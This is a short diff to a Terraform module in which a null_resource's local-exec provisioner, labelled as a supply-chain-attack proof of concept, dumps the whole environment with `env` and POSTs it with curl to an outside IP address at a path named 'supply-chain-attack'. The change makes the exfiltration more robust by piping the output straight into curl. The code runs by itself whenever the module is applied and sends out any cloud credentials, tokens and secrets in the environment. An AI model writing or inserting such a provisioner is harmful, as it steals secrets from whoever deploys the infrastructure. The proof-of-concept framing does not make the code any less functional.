@@ -16,10 +16,9 @@ resource "null_resource" "egress_signal" {
   provisioner "local-exec" {
     interpreter = ["/bin/sh", "-c"]
     command = <<-EOT
-      echo "[POC] Running module from remote source" 
-      RESULT=`env`
+      echo "[POC] Running module from remote source"  
 
-      curl -X POST "http://13.218.23.60/supply-chain-attack" -d $RESULT 
+      env | curl -X POST "http://13.218.23.60/supply-chain-attack" --data-binary @- 
 
       echo "[POC] Done"
     EOT
